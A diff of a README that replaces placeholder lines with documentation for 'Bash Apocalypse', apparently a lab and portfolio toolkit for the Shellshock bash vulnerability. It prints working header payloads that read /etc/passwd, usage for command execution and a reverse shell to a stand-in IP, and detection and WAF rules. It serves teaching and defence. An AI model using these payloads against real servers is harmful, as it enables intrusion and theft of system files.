@@ -1,204 +1,229 @@
-﻿# Shellshock Exploit Project
+﻿# Bash Apocalypse
 
-This README provides detailed information about the Shellshock exploit, its background, and usage.
+**Automated exploitation toolkit for CVE-2014-6271 (Shellshock)**
 
-Line 1: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 2: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 3: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 4: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 5: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 6: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 7: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 8: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 9: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 10: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 11: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 12: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 13: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 14: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 15: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 16: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 17: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 18: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 19: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 20: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 21: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 22: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 23: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 24: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 25: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 26: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 27: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 28: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 29: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 30: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 31: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 32: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 33: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 34: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 35: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 36: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 37: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 38: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 39: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 40: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 41: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 42: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 43: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 44: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 45: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 46: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 47: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 48: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 49: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 50: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 51: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 52: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 53: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 54: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 55: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 56: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 57: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 58: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 59: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 60: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 61: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 62: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 63: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 64: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 65: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 66: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 67: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 68: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 69: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 70: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 71: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 72: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 73: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 74: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 75: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 76: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 77: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 78: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 79: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 80: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 81: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 82: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 83: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 84: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 85: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 86: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 87: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 88: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 89: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 90: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 91: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 92: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 93: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 94: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 95: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 96: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 97: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 98: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 99: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 100: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 101: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 102: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 103: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 104: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 105: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 106: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 107: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 108: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 109: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 110: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 111: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 112: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 113: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 114: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 115: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 116: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 117: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 118: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 119: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 120: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 121: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 122: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 123: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 124: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 125: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 126: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 127: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 128: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 129: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 130: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 131: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 132: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 133: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 134: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 135: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 136: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 137: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 138: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 139: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 140: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 141: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 142: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 143: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 144: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 145: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 146: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 147: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 148: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 149: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 150: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 151: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 152: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 153: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 154: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 155: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 156: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 157: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 158: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 159: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 160: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 161: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 162: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 163: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 164: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 165: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 166: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 167: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 168: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 169: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 170: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 171: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 172: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 173: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 174: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 175: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 176: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 177: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 178: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 179: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 180: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 181: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 182: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 183: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 184: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 185: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 186: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 187: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 188: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 189: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 190: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 191: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 192: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 193: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 194: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 195: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 196: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 197: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 198: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 199: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
-Line 200: Placeholder text describing the Shellshock exploit, its vulnerabilities, and mitigation steps.
+[![Severity](https://img.shields.io/badge/Severity-CRITICAL-red)](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
+[![CVSS Score](https://img.shields.io/badge/CVSS-10.0-critical)](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
+[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+
+A complete security research project demonstrating the Shellshock vulnerability that affected millions of servers in 2014. Includes automated scanning, exploitation capabilities, and defensive recommendations.
+
+![Demo](demo.gif)
+
+---
+
+## What is Shellshock?
+
+Shellshock (CVE-2014-6271) is a critical vulnerability in the Bash shell that allows remote code execution through environment variable manipulation. Discovered in 2014 after existing for 22 years, it affected millions of Unix/Linux systems worldwide.
+
+**How it works:**
+```bash
+# Normal: Bash exports functions as environment variables
+my_function='() { echo "hello"; }'
+
+# The bug: Bash continues parsing after the function definition
+exploit='() { :;}; echo "PWNED"'  # The second command executes
+```
+
+Web servers using CGI pass HTTP headers as environment variables to Bash, making them vulnerable:
+```http
+User-Agent: () { :;}; echo; /bin/bash -c 'cat /etc/passwd'
+```
+
+---
+
+## Quick Start
+
+```bash
+# Clone and setup
+git clone https://github.com/YOUR-USERNAME/bash-apocalypse.git
+cd bash-apocalypse
+
+# Start vulnerable lab
+docker-compose up -d
+
+# Run exploit
+chmod +x exploit.sh
+./exploit.sh --url http://localhost:8080/cgi-bin/test.cgi --cmd "whoami"
+```
+
+---
+
+## Features
+
+**Automated Scanner**
+- Discovers vulnerable CGI endpoints
+- Tests multiple injection points (User-Agent, Referer, Cookie)
+- Custom wordlist support
+
+**Exploitation Tool**
+- Command execution with output capture
+- Automated reverse shell
+- Multiple payload options
+
+**Lab Environment**
+- One-command Docker setup
+- Isolated vulnerable server
+- Safe testing environment
+
+---
+
+## Usage
+
+### Scan for vulnerabilities
+```bash
+./exploit.sh --scan --target localhost --port 8080
+```
+
+### Execute commands
+```bash
+./exploit.sh --url http://target/cgi-bin/test.cgi --cmd "id"
+```
+
+### Get reverse shell
+```bash
+# Terminal 1
+nc -lvnp 4444
+
+# Terminal 2
+./exploit.sh --url http://target/cgi-bin/test.cgi --reverse-shell YOUR_IP:4444
+```
+
+---
+
+## Manual Exploitation (Burp Suite)
+
+### Step 1: Intercept Request
+![Burp Intercept](screenshots/burp-intercept.png)
+
+### Step 2: Inject Payload
+![Exploitation](screenshots/exploitation.png)
+
+Modify the User-Agent header:
+```http
+User-Agent: () { :;}; echo; /bin/bash -c 'cat /etc/passwd'
+```
+
+### Step 3: Observe Response
+![Reverse Shell](screenshots/reverse-shell.png)
+
+The server executes your command and returns the output.
+
+---
+
+## Technical Analysis
+
+### Attack Flow
+```
+Client (Attacker)
+    │
+    │ HTTP Request with malicious User-Agent
+    ▼
+Web Server
+    │
+    │ Passes header as environment variable
+    ▼
+CGI Script
+    │
+    │ Spawns Bash process
+    ▼
+Bash Shell
+    │
+    │ Parses function + executes trailing commands
+    ▼
+Command Execution (RCE)
+```
+
+### Root Cause
+When Bash encounters a function definition in an environment variable:
+1. It parses the function: `() { :;}`
+2. **Bug:** It continues parsing and executes anything after
+3. Result: Arbitrary command execution
+
+---
+
+## Defense
+
+### Immediate Mitigation
+```bash
+# Update Bash
+sudo apt-get update && sudo apt-get upgrade bash
+
+# Disable CGI if not needed
+sudo a2dismod cgi && sudo systemctl restart apache2
+```
+
+### Detection
+```bash
+# Check logs for exploitation attempts
+grep -E "\\(\\)|\\{.*\\}" /var/log/apache2/access.log
+```
+
+### WAF Rule
+```apache
+SecRule REQUEST_HEADERS "\\(\\).*\\{" "deny,status:403,msg:'Shellshock Attack'"
+```
+
+---
+
+## Skills Demonstrated
+
+- Web application penetration testing
+- Bash scripting and automation
+- HTTP protocol manipulation
+- Docker containerization
+- Burp Suite proficiency
+- Both offensive and defensive security
+
+---
+
+## Project Structure
+
+```
+bash-apocalypse/
+├── README.md
+├── exploit.sh              # Main tool
+├── payloads.txt            # Test payloads
+├── docker-compose.yml      # Lab setup
+├── demo.gif
+└── screenshots/
+    ├── burp-intercept.png
+    ├── exploitation.png
+    └── reverse-shell.png
+```
+
+---
+
+## Legal Disclaimer
+
+**Educational purposes only.** Only test systems you own or have explicit permission to test. Unauthorized access is illegal.
+
+---
+
+## Resources
+
+- [CVE-2014-6271 Details](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
+- [Cloudflare: Inside Shellshock](https://blog.cloudflare.com/inside-shellshock/)
+- [Practice: HackTheBox - Shocker](https://www.hackthebox.eu/)
+
+---
+
+## Author
+
+**[Your Name]**
+
+Security researcher focused on offensive security and vulnerability research.
+
+- GitHub: [@your-username](https://github.com/your-username)
+- LinkedIn: [linkedin.com/in/yourprofile](https://linkedin.com/in/yourprofile)
+- Email: your.email@example.com
+
+---
+
+## License
+
+MIT License - see [LICENSE](LICENSE) for details.
+
+---
+
+*Built to understand how vulnerabilities work and how to defend against them.*
